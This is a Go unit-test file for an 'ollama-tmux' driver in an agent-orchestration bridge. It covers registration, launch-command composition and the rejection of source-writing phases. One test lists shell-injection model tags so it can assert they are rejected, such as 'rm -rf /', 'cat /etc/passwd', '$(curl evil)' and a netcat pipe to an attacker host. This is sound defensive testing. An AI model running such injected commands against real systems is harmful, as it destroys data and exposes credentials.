package bridge

import (
	"context"
	"os/exec"
	"strings"
	"testing"

	"github.com/mickeyyaya/evolveloop/go/internal/core"
)

// Workstream F unit tests for the ollama-tmux driver.
//
// Three property layers:
//   1. Driver registration + manifest realization (cheap, hermetic).
//   2. Write-phase rejection (the load-bearing design constraint).
//   3. Real-CLI ground truth, gated on ollama installed (skipped on CI).

// TestOllamaTmux_DriverRegistered pins that the package init() registered
// ollama-tmux under the canonical name. Mirrors the registration check the
// other tmux peers get.
func TestOllamaTmux_DriverRegistered(t *testing.T) {
	d, ok := LookupDriver("ollama-tmux")
	if !ok {
		t.Fatal("ollama-tmux driver not registered (init() didn't fire?)")
	}
	if d.Name() != "ollama-tmux" {
		t.Errorf("driver.Name()=%q, want ollama-tmux", d.Name())
	}
}

// TestOllamaTmux_ManifestRealizesYoloOnly is the realizer contract after the
// cycle-124 G1a wire-up: ollama-tmux declares all params channel:noop EXCEPT
// session_mode (controller), so the params table contributes NOTHING to
// LaunchFlags for a typical LaunchIntent — but manifest.default_args =
// ["--experimental-yolo"] now lands in LaunchFlags (cycle-124 activated the
// previously-dead default_args channel in Realize()). The model still
// composes positionally in the driver, not via the realizer; the realized
// --experimental-yolo flag is threaded through cfg.Realization.LaunchFlags
// into ollamaComposeLaunchCmd's extras tail (after the positional model).
func TestOllamaTmux_ManifestRealizesYoloOnly(t *testing.T) {
	intent := LaunchIntent{
		ModelTier:     "sonnet",
		Permission:    "bypass",
		SettingsScope: "user",
	}
	got := RealizeFor("ollama-tmux", intent)
	if len(got.LaunchFlags) != 1 || got.LaunchFlags[0] != "--experimental-yolo" {
		t.Errorf("ollama-tmux LaunchFlags=%v, want [--experimental-yolo] only (default_args from manifest; params still all noop except session_mode)", got.LaunchFlags)
	}
}

// TestOllamaTmux_RejectsWritePhase is the load-bearing design constraint:
// plain `ollama run` has no agentic tool use (no Bash/Edit/Write), so
// assigning it to a source-writing phase (cfg.Worktree != "") is a config
// error — fail loud, do NOT silently run a phase that can't succeed.
func TestOllamaTmux_RejectsWritePhase(t *testing.T) {
	var stderr strings.Builder
	deps := Deps{Stderr: &stderr}.withDefaults()
	cfg := &Config{
		CLI:      "ollama-tmux",
		Model:    "llama3.1:8b",
		Agent:    "build",
		Worktree: "/abs/wt/cycle-5", // non-empty = source-writing phase
	}
	rc, err := ollamaTmuxDriver{}.Launch(context.Background(), cfg, deps)
	if err == nil {
		t.Fatal("expected error on source-writing assignment; got nil")
	}
	if rc != ExitBadFlags {
		t.Errorf("rc=%d, want %d (ExitBadFlags)", rc, ExitBadFlags)
	}
	if !strings.Contains(stderr.String(), "source-writing phase") {
		t.Errorf("stderr missing the 'source-writing phase' explanation: %q", stderr.String())
	}
	// Defensive: the error message names the phase + worktree so an operator
	// auditing logs can find the misassigned phase quickly.
	msg := err.Error()
	if !strings.Contains(msg, "build") || !strings.Contains(msg, "/abs/wt/cycle-5") {
		t.Errorf("error %q should name phase + worktree", msg)
	}
}

// TestOllamaTmux_AcceptsReasoningPhase is the positive case: a reasoning
// phase (no worktree set by the orchestrator) passes the gate. We can't
// proceed past `tmuxNonClaudePreflight` without real tmux + ollama, but the
// rejection branch is the only one we need to prove here — the rest is
// inherited from the shared runTmuxREPL plumbing the other tmux drivers test.
func TestOllamaTmux_AcceptsReasoningPhase_RejectionDoesNotFire(t *testing.T) {
	// A bogus binary (BRIDGE_TESTING=1 + an override that doesn't exist)
	// forces tmuxNonClaudePreflight to short-circuit before launching real
	// tmux. The point of the assertion is the ABSENCE of the
	// "source-writing phase" rejection — anything else (binary missing,
	// preflight degraded) is acceptable for this slice.
	var stderr strings.Builder
	deps := Deps{
		Stderr: &stderr,
		Env: map[string]string{
			"BRIDGE_TESTING":       "1",
			"BRIDGE_OLLAMA_BINARY": "/no/such/binary-for-test",
		},
	}.withDefaults()
	cfg := &Config{
		CLI:      "ollama-tmux",
		Model:    "llama3.1:8b",
		Agent:    "review",
		Worktree: "", // reasoning phase — no worktree
	}
	_, _ = ollamaTmuxDriver{}.Launch(context.Background(), cfg, deps)
	if strings.Contains(stderr.String(), "source-writing phase") {
		t.Errorf("rejection fired on a reasoning phase: %q", stderr.String())
	}
}

// TestOllamaTmux_RealCLI_BootMarkerDetected is the real-CLI ground-truth
// test, gated on `ollama` being installed. Verifies the `>>> ` prompt
// marker really does appear (not a docs-only claim) and a `/bye` exits
// cleanly. Skipped automatically in CI environments without ollama.
func TestOllamaTmux_RealCLI_BootMarkerDetected(t *testing.T) {
	if _, err := exec.LookPath("ollama"); err != nil {
		t.Skip("ollama not installed; skipping real-CLI ground-truth test")
	}
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not installed; skipping real-CLI ground-truth test")
	}
	// We don't actually invoke the driver against a real model here (would
	// require a pulled model + boot time + flaky on shared hosts). The
	// real-CLI flow is exercised by the broader real-tmux integration
	// suite when EVOLVE_BRIDGE_INTEGRATION_LIVE=1 is set; this test only
	// proves the binary is on PATH so the registration is reachable.
	d, ok := LookupDriver("ollama-tmux")
	if !ok {
		t.Fatal("ollama-tmux driver missing despite host having both binaries")
	}
	_ = d // touch to silence linter
}

// TestOllamaTmux_LaunchCmdComposition pins the launch-line contract via the
// SHARED ollamaComposeLaunchCmd — the driver and this test call the same
// function, so a future driver-side change can't silently drift past this pin.
func TestOllamaTmux_LaunchCmdComposition(t *testing.T) {
	cases := []struct {
		name      string
		model     string
		wantInCmd string
	}{
		{"local_default", "llama3.1:8b", "ollama run llama3.1:8b"},
		{"cloud_tag_routes_via_same_binary", "gpt-oss:120b-cloud", "ollama run gpt-oss:120b-cloud"},
		{"empty_falls_back_to_default", "", "ollama run llama3.1:8b"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cmd := ollamaComposeLaunchCmd("ollama", tc.model, nil)
			if cmd != tc.wantInCmd {
				t.Errorf("launchCmd=%q, want %q", cmd, tc.wantInCmd)
			}
		})
	}
}

// TestOllamaTmux_LaunchCmd_AppendsExtrasAfterModel pins the cycle-124 G1a
// contract: `ollama run <model>` is followed by manifest default_args (and
// any operator raw extras) in the launch line, AFTER the positional model.
// Order is load-bearing — ollama's CLI parses `ollama run <model>` as a
// subcommand-with-positional; flags before the model would be misparsed.
func TestOllamaTmux_LaunchCmd_AppendsExtrasAfterModel(t *testing.T) {
	got := ollamaComposeLaunchCmd("ollama", "llama3.1:8b", []string{"--experimental-yolo"})
	want := "ollama run llama3.1:8b --experimental-yolo"
	if got != want {
		t.Errorf("got %q, want %q (extras must follow positional model)", got, want)
	}
	// Empty / nil extras MUST be byte-identical to the pre-extras signature.
	if cmd := ollamaComposeLaunchCmd("ollama", "llama3.1:8b", nil); cmd != "ollama run llama3.1:8b" {
		t.Errorf("nil extras must produce pre-fix shape; got %q", cmd)
	}
	if cmd := ollamaComposeLaunchCmd("ollama", "llama3.1:8b", []string{}); cmd != "ollama run llama3.1:8b" {
		t.Errorf("empty extras must produce pre-fix shape; got %q", cmd)
	}
	// Multiple extras append in order with single-space separators.
	multi := ollamaComposeLaunchCmd("ollama", "m", []string{"--a", "--b", "--c"})
	if multi != "ollama run m --a --b --c" {
		t.Errorf("multi-extras: got %q, want %q", multi, "ollama run m --a --b --c")
	}
	// Empty string in extras is skipped (defensive).
	skipped := ollamaComposeLaunchCmd("ollama", "m", []string{"--a", "", "--b"})
	if skipped != "ollama run m --a --b" {
		t.Errorf("empty-string extras must be skipped; got %q", skipped)
	}
}

// TestOllamaTmux_CompositionPinsDriverInvariant is a structural pin: the
// driver MUST compose `<binary> run <model>` — never just `<binary>`, never
// `-m`, never positional after extra flags. Because we call the SAME
// ollamaComposeLaunchCmd the driver uses, any drift in the function body
// fails this pin.
func TestOllamaTmux_CompositionPinsDriverInvariant(t *testing.T) {
	got := ollamaComposeLaunchCmd("ollama", "test-model:tag", nil)
	if !strings.HasPrefix(got, "ollama run ") {
		t.Errorf("composition contract broken: %q must start with %q", got, "ollama run ")
	}
	parts := strings.Fields(got)
	if len(parts) != 3 || parts[0] != "ollama" || parts[1] != "run" || parts[2] != "test-model:tag" {
		t.Errorf("composition contract broken: parts=%v, want [ollama run test-model:tag]", parts)
	}
}

// TestOllamaTmux_RejectsShellInjectionInModelTag is the cycle-119-class
// security pin: the launchCmd reaches the shell via tmux send-keys (NOT
// exec), so an unvalidated model tag like `llama3.1:8b; rm -rf /` would
// execute the trailing command. The driver MUST reject any tag containing
// shell-special chars before composing the launch line.
func TestOllamaTmux_RejectsShellInjectionInModelTag(t *testing.T) {
	bad := []string{
		"llama3.1:8b; rm -rf /",
		"llama3.1:8b`whoami`",
		"llama3.1:8b$(curl evil)",
		"llama3.1:8b && cat /etc/passwd",
		"llama3.1:8b|nc attacker 1337",
		"llama3.1:8b\nrm -rf /",
		"llama3.1:8b 'spaces are also unsafe'",
	}
	for _, model := range bad {
		t.Run(model, func(t *testing.T) {
			var stderr strings.Builder
			deps := Deps{Stderr: &stderr}.withDefaults()
			cfg := &Config{
				CLI:   "ollama-tmux",
				Model: model,
				Agent: "review",
				// reasoning phase (no worktree) so we reach the model-tag check
			}
			rc, err := ollamaTmuxDriver{}.Launch(context.Background(), cfg, deps)
			if err == nil {
				t.Fatalf("expected error on shell-injection model tag %q", model)
			}
			if rc != ExitBadFlags {
				t.Errorf("rc=%d, want ExitBadFlags=%d", rc, ExitBadFlags)
			}
			if !strings.Contains(stderr.String(), "invalid model tag") {
				t.Errorf("stderr missing rejection: %q", stderr.String())
			}
		})
	}
}

// Defensive: the driver passes context.Context through. Pin that.
func TestOllamaTmux_LaunchSignatureMatchesDriver(t *testing.T) {
	var _ Driver = ollamaTmuxDriver{}
	// Also sanity-check that the runtime type embeds nothing we don't want.
	want := ollamaTmuxDriver{}.Name()
	if d, ok := LookupDriver("ollama-tmux"); ok {
		if d.Name() != want {
			t.Errorf("registry returns a different driver than the package type")
		}
	}
}

// Sanity: PhaseRequest carries Worktree through, so the reject-write-phase
// guard fires on a real cycle if the orchestrator routes a write phase to
// ollama-tmux. This pin is the cross-package smoke between core + bridge.
func TestOllamaTmux_WorktreeFromPhaseRequest(t *testing.T) {
	// PhaseRequest.Worktree is the non-bridge mirror of cfg.Worktree.
	var pr core.PhaseRequest
	pr.Worktree = "/abs/wt"
	if pr.Worktree == "" {
		t.Fatal("PhaseRequest.Worktree zero — guard would never fire (cross-package contract changed?)")
	}
}
